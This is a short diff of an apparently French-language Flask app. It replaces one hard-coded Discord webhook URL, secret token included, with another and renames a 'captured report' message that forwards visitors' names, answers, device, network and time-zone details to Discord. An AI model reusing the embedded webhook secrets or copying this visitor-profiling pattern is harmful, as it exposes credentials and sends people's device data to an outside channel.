@@ -7,7 +7,7 @@ app = Flask(__name__)
 
 DISCORD_WEBHOOK_URL = os.getenv(
     "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1566464807782187121/bIQS3Y0lV4g4YuZ4XzTnqdUlNs9hmjf32Nzvkkon_mqnHxYPUtRvotAORxbCkvxzhkHJ"
+    "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz"
 )
 
 @app.route("/")
@@ -49,7 +49,7 @@ def submit_consent():
     reseau = device.get('connexionReseau', 'Non disponible')
     time_zone = device.get('fuseauHoraire', 'Non disponible')
 
-    content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
+    content_text = f"""✅ **Nouveau Rapport Capturé (Serveur de Youssef):**
 • **Nom / Statut:** {username}
 • **Questions:** {q_text}
 • **Appareil:** {appareil}
